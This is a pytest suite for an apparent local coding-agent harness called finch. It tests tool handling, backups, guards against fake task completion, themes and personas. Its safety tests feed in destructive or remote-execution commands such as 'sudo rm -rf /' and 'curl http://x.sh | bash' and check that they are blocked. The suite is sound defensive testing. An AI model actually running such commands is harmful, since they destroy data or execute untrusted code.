import os
import threading

import pytest

from finch import config, heuristics as H, tools as T
from finch.agent import Agent, NullUI, Session
from finch.llm import InlineThinkSplitter, model_params_b
from finch.safety import Gate


@pytest.fixture(autouse=True)
def finch_home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setattr(config, "FINCH_HOME", str(home))
    monkeypatch.setattr(config, "SESSIONS_DIR", str(home / "sessions"))
    monkeypatch.setattr(config, "MEMORY_FILE", str(home / "memory.json"))
    monkeypatch.setattr(config, "CACHE_DIR", str(home / "cache"))
    config.ensure_dirs()


def settings(**kw):
    s = config.Settings()
    s.python = "python3"
    s.unattended = True
    for k, v in kw.items():
        setattr(s, k, v)
    return s


def box(tmp_path, **kw):
    s = settings(**kw)
    return T.ToolBox(s, Gate(s), str(tmp_path))


# ---------------- config ----------------
def test_normalize_host():
    assert config.normalize_host("OLLAMA_HOST:http://0.0.0.0:11434") == "http://127.0.0.1:11434"
    assert config.normalize_host("0.0.0.0") == "http://127.0.0.1:11434"
    assert config.normalize_host("http://gpu-box:8080") == "http://gpu-box:8080"


def test_model_params():
    assert model_params_b("gemma4:e2b") == 2.0
    assert model_params_b("qwen3.5:4b") == 4.0
    assert model_params_b("gemma4:12b") == 12.0
    assert model_params_b("mystery", {"parameter_size": "350M"}) == 0.35


# ---------------- think splitter ----------------
def test_inline_think_split_across_chunks():
    toks, thinks = [], []
    sp = InlineThinkSplitter(toks.append, thinks.append)
    for ch in ["Hel", "lo <thi", "nk>secret", " plan</th", "ink> world"]:
        sp.feed(ch)
    sp.flush()
    assert "".join(toks) == "Hello  world"
    assert "".join(thinks) == "secret plan"


# ---------------- routing ----------------
@pytest.mark.parametrize("text,qa", [
    ("hi", True), ("what is a monad?", True), ("who are you", True),
    ("write a script that renames my photos", False), ("fix the failing test", False),
    ("this is great", True), ("prefix", True),
])
def test_is_qa(text, qa):
    assert H.is_qa(text) is qa


def test_short_followup_continues_task():
    assert H.is_qa("now the other one", has_progress=True) is False


def test_route_categories():
    assert {"code", "file"} <= H.route_categories("debug the python script")
    assert "web" in H.route_categories("research the latest news on rust")
    assert H.route_categories("blorp") == {"file", "code", "web"}


# ---------------- salvage ----------------
KNOWN = set(T.ALL_BUILTIN) | set(T.ALIASES)


@pytest.mark.parametrize("text,name,arg", [
    ('{"name": "create_file", "arguments": {"path": "a.txt", "content": "x"}}', "create_file", "path"),
    ('```json\n{"finish": {"summary": "done"}}\n```', "finish", "summary"),
    ('<tool_call>{"name":"list_dir","arguments":{"path":"."}}</tool_call>', "list_dir", "path"),
    ('finish(summary="0")', "finish", "summary"),
    ('finish{summary:<|"|>all good<|"|>}', "finish", "summary"),
    ('call:read_file{path:<|"|>main.py<|"|>}', "read_file", "path"),
])
def test_salvage(text, name, arg):
    calls = H.try_parse_tool_calls(text, KNOWN)
    assert calls and calls[0][0] == name and arg in calls[0][1]


def test_salvage_rejects_prose():
    assert H.try_parse_tool_calls("I will call finish(summary='x') next.", KNOWN) is None
    assert H.try_parse_tool_calls('{"foo": {"a": 1}}', KNOWN) is None


def test_semantically_empty():
    assert H.semantically_empty("<think>\n\n</think>")
    assert H.semantically_empty("<think>half a thought")
    assert not H.semantically_empty("<think>x</think> answer")


# ---------------- tools ----------------
def test_clobber_guard_and_backup(tmp_path):
    tb = box(tmp_path)
    big = "line\n" * 200
    assert "created" in tb.run("create_file", {"path": "a.txt", "content": big})
    r = tb.run("create_file", {"path": "a.txt", "content": "tiny"})
    assert r.startswith("[clobber guard")
    r = tb.run("create_file", {"path": "a.txt", "content": "tiny", "replace": True})
    assert "backed up" in r
    assert (tmp_path / ".finch/backups/a.txt.bak").read_text() == big
    assert tb.rollback.undo().startswith("restored")
    assert (tmp_path / "a.txt").read_text() == big


def test_auto_repair_double_escaped_python(tmp_path):
    tb = box(tmp_path)
    tb.run("create_file", {"path": "x.py", "content": "def f():\\n    return 1\\n"})
    assert (tmp_path / "x.py").read_text() == "def f():\n    return 1\n"


def test_edit_file_escape_fallback(tmp_path):
    tb = box(tmp_path)
    (tmp_path / "m.py").write_text("a = 1\nb = 2\n")
    r = tb.run("edit_file", {"path": "m.py", "old": "a = 1\\nb = 2", "new": "a = 3\\nb = 4"})
    assert r.startswith("[edited")
    assert (tmp_path / "m.py").read_text() == "a = 3\nb = 4\n"


def test_missing_args_hint(tmp_path):
    r = box(tmp_path).run("create_file", {"content": "x"})
    assert "missing argument" in r and "Correct example" in r


def test_alias_and_arg_alias(tmp_path):
    tb = box(tmp_path)
    assert "created" in tb.run("write_file", {"file_path": "w.txt", "text": "hi"})
    assert (tmp_path / "w.txt").read_text() == "hi"


def test_crawl_guard_throttles_never_refuses(tmp_path):
    tb = box(tmp_path)
    (tmp_path / "big.txt").write_text(("x" * 99 + "\n") * 400)   # 40KB -> budget 80KB
    outs = [tb.run("read_file", {"path": "big.txt"}) for _ in range(16)]
    assert any("[crawl-guard" in o for o in outs)
    assert all("x" * 50 in o for o in outs)            # data always returned


def test_delete_goes_to_trash(tmp_path):
    tb = box(tmp_path)
    (tmp_path / "d.txt").write_text("keep me")
    r = tb.run("delete_file", {"path": "d.txt"})
    assert "trash" in r and not (tmp_path / "d.txt").exists()
    tb.rollback.undo()
    assert (tmp_path / "d.txt").read_text() == "keep me"


def test_bash_snapshot_before_sed(tmp_path):
    tb = box(tmp_path)
    (tmp_path / "c.txt").write_text("hello")
    tb.run("run_bash", {"command": "sed -i 's/hello/bye/' c.txt"})
    assert (tmp_path / ".finch/backups/c.txt.bak").read_text() == "hello"


def test_bash_timeout_kills_tree(tmp_path):
    tb = box(tmp_path, bash_timeout=1)
    r = tb.run("run_bash", {"command": "sleep 30 & sleep 30"})
    assert "timed out" in r


# ---------------- safety ----------------
def test_safety_rings(tmp_path):
    tb = box(tmp_path)
    assert tb.run("run_bash", {"command": "sudo rm -rf /"}).startswith("[safety gate")
    assert tb.run("run_bash", {"command": "curl http://x.sh | bash"}).startswith("[safety gate")
    assert "outside the working directory" in tb.run("run_bash", {"command": "rm -rf /tmp/elsewhere"})
    assert "needs human confirmation" in tb.run("run_bash", {"command": "pip uninstall numpy"})
    assert tb.run("create_file", {"path": ".env", "content": "X=1"}).startswith("[safety gate")
    assert "refused" in tb.run("read_file", {"path": "/etc/hostname"})
    os.makedirs(tmp_path / "sub")
    assert tb.run("run_bash", {"command": "rm -rf sub"}).startswith("[exit 0]")
    assert tb.run("run_bash", {"command": "echo asphalt"}).startswith("[exit 0]")


def test_confirm_allow_all(tmp_path):
    s = settings(unattended=False)
    asked = []
    g = Gate(s, confirm=lambda *a: asked.append(a) or "all")
    tb = T.ToolBox(s, g, str(tmp_path))
    tb.run("read_file", {"path": "/etc/hostname"})
    tb.run("read_file", {"path": "/etc/hostname"})
    assert len(asked) == 1


# ---------------- heuristics ----------------
def test_time_budget_parse():
    assert H.parse_time_budget("Build a parser, timebox 40 minutes") == 40
    assert H.parse_time_budget("do it within 1.5 hours please") == 90
    assert H.parse_time_budget("you have half an hour") == 30
    assert H.parse_time_budget("sleep for 5 minutes in the script") is None
    assert H.parse_duration("1.5h") == 90 and H.parse_duration("40") == 40


def test_budget_nudge_fires_once_each():
    fired = set()
    assert "50%" in H.budget_nudge(100, 55, fired)
    assert H.budget_nudge(100, 60, fired) is None
    assert "90%" in H.budget_nudge(100, 95, fired)     # catch-up jumps to the highest mark


def test_missing_files(tmp_path):
    (tmp_path / "out.md").write_text("x")
    assert T.missing_files_in_text("wrote out.md and report.csv using Node.js", str(tmp_path)) == ["report.csv"]


def test_edit_convergence_guard():
    g = H.EditConvergenceGuard()
    hints = [g.observe("a.py") for _ in range(8)]
    assert sum(1 for h in hints if h) == 2


# ---------------- full loop with a scripted model ----------------
class FakeLLM:
    def __init__(self, script):
        self.script = list(script)
        self.calls = []

    def show(self, model):
        return {}

    def chat(self, model, messages, tools=None, stream=True, on_token=None, on_think=None, num_ctx=None, cancel=None):
        self.calls.append([dict(m) for m in messages])
        if not tools and not stream:     # compaction / wrap-up
            return {"message": {"content": "summary"}}
        step = self.script.pop(0) if self.script else ("finish", {"summary": "done"})
        if isinstance(step, str):
            return {"message": {"role": "assistant", "content": step}, "prompt_eval_count": 100}
        name, args = step
        return {"message": {"role": "assistant", "content": "",
                            "tool_calls": [{"function": {"name": name, "arguments": args}}]},
                "prompt_eval_count": 100}


def make_agent(tmp_path, script, **kw):
    s = settings(**kw)
    g = Gate(s)
    tb = T.ToolBox(s, g, str(tmp_path))
    llm = FakeLLM(script)
    a = Agent(s, llm, tb, g, NullUI())
    a.session = Session(str(tmp_path), "fake:12b")
    return a, llm


def user_notes(llm):
    return [m["content"] for m in llm.calls[-1] if m["role"] == "user"]


def test_fake_finish_rejected_then_reread(tmp_path):
    a, llm = make_agent(tmp_path, [
        ("finish", {"summary": "done"}),                                 # fake finish -> rejected
        ("create_file", {"path": "out.txt", "content": "42"}),
        ("finish", {"summary": "wrote out.txt"}),                        # self-check reread -> rejected once
        ("finish", {"summary": "wrote out.txt"}),
    ])
    res = a.run_turn("write the answer 42 into out.txt")
    notes = "\n".join(user_notes(llm))
    assert "haven't done any real work" in notes
    assert "original task" in notes
    assert res == "wrote out.txt"


def test_claimed_missing_file_rejected(tmp_path):
    a, llm = make_agent(tmp_path, [
        ("create_file", {"path": "a.md", "content": "x"}),
        ("finish", {"summary": "created a.md and b.md"}),
        ("create_file", {"path": "b.md", "content": "y"}),
        ("finish", {"summary": "created a.md and b.md"}),
        ("finish", {"summary": "created a.md and b.md"}),
    ])
    a.run_turn("create the files a.md and b.md")
    assert any("don't exist" in n and "b.md" in n for n in user_notes(llm))


def test_test_guard_rejects_failing_tests(tmp_path):
    (tmp_path / "test_x.py").write_text("def test_x():\n    assert 1 == 2\n")
    a, llm = make_agent(tmp_path, [
        ("create_file", {"path": "x.py", "content": "X = 1\n"}),
        ("finish", {"summary": "done"}),
    ])
    a.run_turn("implement x.py so the tests pass")
    assert any("tests in the directory do not pass" in n for n in user_notes(llm))


def test_duplicate_call_blocked_and_streak_disable(tmp_path):
    a, llm = make_agent(tmp_path, [("list_dir", {"path": "."})] * 12 + [
        ("create_file", {"path": "o.txt", "content": "x"})])
    a.run_turn("organize the files in this folder")
    notes = "\n".join(user_notes(llm))
    assert "duplicate" in notes
    tools_seen = [m for m in llm.calls[-1] if m["role"] == "tool"]
    assert any("disabled" in m["content"] or "blocked" in m["content"] for m in tools_seen)


def test_empty_turn_ladder_resets(tmp_path):
    a, llm = make_agent(tmp_path, [""] * 6 + [("create_file", {"path": "o.txt", "content": "x"})])
    a.run_turn("write o.txt with an x in it")
    joined = "\n".join(str(m.get("content")) for c in llm.calls for m in c)
    assert "empty output" in joined and "context was reset" in joined


def test_chat_mode_answers_once(tmp_path):
    a, llm = make_agent(tmp_path, ["Hello! I'm Finch."])
    assert a.run_turn("hi") == "Hello! I'm Finch."
    assert len(llm.calls) == 1


def test_small_model_disables_edit(tmp_path):
    (tmp_path / "f.py").write_text("a=1\n")
    a, llm = make_agent(tmp_path, [("edit_file", {"path": "f.py", "old": "a=1", "new": "a=2"}),
                                   ("create_file", {"path": "f.py", "content": "a=2\n"})])
    a.session.model = "tiny:2b"
    a.run_turn("change a to 2 in f.py")
    assert (tmp_path / "f.py").read_text() == "a=2\n"
    assert any("disabled" in m["content"] for m in llm.calls[1] if m["role"] == "tool")


def test_interrupt_repairs_dangling_tool_calls(tmp_path):
    a, llm = make_agent(tmp_path, [])
    ev = threading.Event()
    ev.set()
    a.run_turn("write a file", cancel=ev)
    assert a.session.messages[-1]["content"].startswith("[harness] The user interrupted")


def test_prose_after_self_check_is_delivery(tmp_path):
    a, llm = make_agent(tmp_path, [
        ("create_file", {"path": "out.txt", "content": "42"}),
        ("finish", {"summary": "wrote out.txt"}),            # self-check reread
        "All requirements are met: out.txt contains 42.",    # prose instead of finish
    ])
    res = a.run_turn("write the answer 42 into out.txt")
    assert res.startswith("All requirements are met")
    assert len(llm.calls) == 3


# ---------------- tricks & themes ----------------
from finch import themes, tricks as TR


def test_every_trick_key_is_referenced_in_code():
    import pathlib
    src = "".join(p.read_text() for p in pathlib.Path("finch").glob("*.py") if p.name != "tricks.py")
    missing = [k for k in TR.KEYS if f'"{k}"' not in src]
    assert not missing, missing


def test_ablation_aliases_expand(monkeypatch):
    monkeypatch.setenv("FINCH_ABLATION", "anti_loop,crawl_guard")
    s = config.load_settings()
    assert not s.on("dup_block") and not s.on("streak_guard") and not s.on("crawl_guard")
    assert s.on("salvage")


def test_legacy_unsafe_key(tmp_path, monkeypatch):
    cfg = tmp_path / "c.json"
    cfg.write_text('{"unsafe": true, "theme": "ocean"}')
    monkeypatch.setattr(config, "CONFIG_FILE", str(cfg))
    s = config.load_settings()
    assert s.unsafe and s.theme == "ocean"


def test_trick_off_salvage(tmp_path):
    a, llm = make_agent(tmp_path, ['{"name": "create_file", "arguments": {"path": "o.txt", "content": "x"}}'] * 3)
    a.s.set_trick("salvage", False)
    a.s.set_trick("repeat_detect", False)
    a.run_turn("write o.txt with an x in it")
    assert not (tmp_path / "o.txt").exists()


def test_trick_off_dup_block_and_backups_and_crawl(tmp_path):
    tb = box(tmp_path)
    tb.s.set_trick("backups", False)
    tb.s.set_trick("clobber_guard", False)
    tb.s.set_trick("crawl_guard", False)
    tb.run("create_file", {"path": "a.txt", "content": "y" * 1000})
    r = tb.run("create_file", {"path": "a.txt", "content": "tiny"})
    assert "clobber" not in r and not (tmp_path / ".finch").exists()
    assert "permanently" in tb.run("delete_file", {"path": "a.txt"})
    (tmp_path / "big.txt").write_text(("x" * 99 + "\n") * 400)
    assert not any("[crawl-guard" in tb.run("read_file", {"path": "big.txt"}) for _ in range(16))


def test_trick_off_qa_layering(tmp_path):
    a, llm = make_agent(tmp_path, ["Hello!", ("finish", {"summary": "hi"})])
    a.s.set_trick("qa_layering", False)
    a.run_turn("hi")
    assert "autonomous agent" in llm.calls[0][0]["content"]


def test_trick_off_finish_gates(tmp_path):
    a, llm = make_agent(tmp_path, [("finish", {"summary": "done"})])
    for k in ("fake_finish_gate", "self_check"):
        a.s.set_trick(k, False)
    assert a.run_turn("write the report file") == "done"
    assert len(llm.calls) == 1


def test_boundary_confirm_off(tmp_path):
    tb = box(tmp_path)
    tb.s.set_trick("boundary_confirm", False)
    assert "refused" not in tb.run("read_file", {"path": "/etc/hostname"})
    assert tb.run("run_bash", {"command": "sudo rm -rf /"}).startswith("[safety gate")   # hard ring stays


@pytest.mark.parametrize("name", list(themes.THEMES))
def test_themes_parse(name):
    from prompt_toolkit.styles import Style
    from rich.console import Console
    Style.from_dict(themes.pt_style_dict(name))
    c = Console(theme=themes.rich_theme(name), file=open(os.devnull, "w"))
    for k in ("accent", "dim", "ok", "err", "warn", "think", "output", "rule", "diff.add", "diff.del",
              "done", "bullet", "border"):
        c.print("x", style=k)


@pytest.mark.parametrize("name", list(themes.THEMES))
def test_theme_swatch_and_menu_render(name):
    from prompt_toolkit.styles import Style
    st = Style.from_dict(themes.pt_style_dict(name))
    for frag in themes.swatch(name):
        st.get_attrs_for_style_str(frag)       # raises on bad colour names


def test_theme_groups_cover_all_and_glyphs():
    assert sorted(n for ns in themes.GROUPS.values() for n in ns) == sorted(themes.THEMES)
    assert themes.glyph("hermes", "bullet") == "☤" and themes.glyph("hermes", "result") == "┊"
    assert themes.glyph("claude", "bullet") == "●"
    for n in themes.THEMES:
        assert themes.glyph(n, "verbs")


# ---------------- souls ----------------
from finch import souls


def test_builtin_souls_listed_and_parsed(tmp_path):
    names = {s["name"] for s in souls.list_souls(str(tmp_path))}
    assert {"concise", "mentor", "careful", "friendly", "pirate"} <= names
    body = souls.load("concise", str(tmp_path))
    assert body.startswith("Be direct") and "description:" not in body


def test_soul_precedence_and_special_files(tmp_path):
    (tmp_path / ".finch" / "souls").mkdir(parents=True)
    (tmp_path / ".finch" / "souls" / "concise.md").write_text("project override")
    assert souls.load("concise", str(tmp_path)) == "project override"
    (tmp_path / ".finch" / "SOUL.md").write_text("---\ndescription: proj\n---\nproject soul")
    s = souls.find("project", str(tmp_path))
    assert s and s["desc"] == "proj" and souls.load("project", str(tmp_path)) == "project soul"


def test_soul_create_and_cap(tmp_path):
    name, path = souls.create("My Soul!")
    assert name == "My-Soul" and os.path.exists(path)
    with open(path, "w") as f:
        f.write("x" * 5000)
    assert souls.load(name, str(tmp_path)).endswith("[soul truncated at 4000 characters]")


def test_soul_injected_in_task_and_chat(tmp_path):
    a, llm = make_agent(tmp_path, ["Arr, hello!", ("create_file", {"path": "o.txt", "content": "x"})])
    a.s.soul = "pirate"
    a.run_turn("hi")
    sysmsg = llm.calls[0][0]["content"]
    assert sysmsg.startswith("# Soul (pirate)") and "cheerful pirate" in sysmsg
    a.s.soul = ""
    a.run_turn("write o.txt containing x")
    assert "# Soul" not in llm.calls[-1][0]["content"]
